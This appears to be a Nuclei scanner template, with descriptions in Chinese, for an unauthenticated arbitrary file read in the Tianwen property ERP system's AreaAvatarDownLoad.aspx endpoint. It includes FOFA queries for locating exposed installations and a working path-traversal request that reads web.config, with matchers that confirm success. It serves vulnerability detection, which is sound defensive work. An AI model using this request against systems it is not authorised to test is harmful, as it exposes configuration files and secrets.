id: tianwenEPR-AreaAvatarDownLoad-File-reading

info:
  tags: tianwenEPR-AreaAvatarDownLoad-File-reading
  name: 天问物业ERP系统 AreaAvatarDownLoad.aspx 任意文件读取漏洞
  author: xc
  severity: high
  description: |-
    fofa: body="天问物业ERP系统" || body="国家版权局软著登字第1205328号" || body="/HM/M_Main/frame/sso.aspx"
    天问物业ERP系统 AreaAvatarDownLoad.aspx 接口处存在任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。



http:
  - raw:
      - |
        GET /HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<configuration>'
          - '</configuration>'
        condition: and
      - type: status
        status: 
          - 200





